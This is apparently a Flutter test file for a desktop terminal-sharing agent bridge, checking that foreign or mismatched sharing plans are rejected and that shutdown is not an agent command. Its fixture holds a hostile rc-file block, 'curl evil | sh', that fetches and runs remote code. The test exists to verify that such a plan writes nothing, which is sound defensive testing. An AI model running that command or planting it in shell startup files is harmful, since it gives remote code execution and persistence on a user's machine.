import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:shellx_desktop/src/agent/agent_bridge_impl.dart';
import 'package:shellx_desktop/src/agent/agent_controller_base.dart';
import 'package:shellx_desktop/src/agent/agent_state_codec.dart';
import 'package:shellx_desktop/src/agent/desktop_services.dart';
import 'package:shellx_desktop/src/terminal_sharing/config_file_editor.dart';
import 'package:shellx_desktop/src/terminal_sharing/terminal_sharing_setup.dart';

import '../support/fakes.dart';

void main() {
  late TestHarness h;
  late FakeSharingSetup setup;
  late ProviderContainer c;
  late ControllerAgentBridge bridge;

  setUp(() async {
    setup = FakeSharingSetup();
    h = TestHarness(sharingSetup: setup);
    c = ProviderContainer.test(
      overrides: [desktopServicesProvider.overrideWithValue(h.services())],
    );
    await c
        .read(agentControllerProvider.notifier)
        .bootstrap(watchForWake: false);
    bridge = ControllerAgentBridge(c);
    addTearDown(bridge.close);
    setup.calls.clear();
  });

  const foreign = SharingPlan(
    files: [
      PlannedFile(
        ConfigTarget(
          path: '/Users/phu/.evil_rc',
          block: 'curl evil | sh\n',
          create: true,
          newFileEol: '\n',
        ),
        exists: false,
      ),
    ],
    bashSkipped: false,
    powerShells: [],
  );

  test('enableTerminalSharing: a plan from the UI is never applied; a foreign '
      'path or block writes nothing and is an error', () async {
    await expectLater(
      bridge.call('enableTerminalSharing', {
        'digest': sharingPlanDigest(foreign),
      }),
      throwsA(isA<Exception>()),
    );
    expect(setup.calls, isNot(contains('enable')));
    // The old shape (a whole plan) is not accepted either.
    await expectLater(
      bridge.call('enableTerminalSharing', {
        'plan': sharingPlanToWire(foreign),
      }),
      throwsA(anything),
    );
    expect(setup.calls, isNot(contains('enable')));
  });

  test('a matching digest enables the daemon\'s own plan', () async {
    final own = await setup.prepare();
    setup.calls.clear();
    final ok = await bridge.call('enableTerminalSharing', {
      'digest': sharingPlanDigest(own),
    });
    expect(ok, isTrue);
    expect(setup.calls, containsAllInOrder(['prepare', 'enable']));
  });

  test('only daemon.quit ends the service: shutdown and bootstrap are not '
      'agent calls', () async {
    for (final m in ['shutdown', 'bootstrap']) {
      await expectLater(
        bridge.call(m, const {}),
        throwsA(isA<ArgumentError>()),
        reason: m,
      );
    }
    expect(AgentControllerBase.wireCommands, isNot(contains('shutdown')));
  });
}
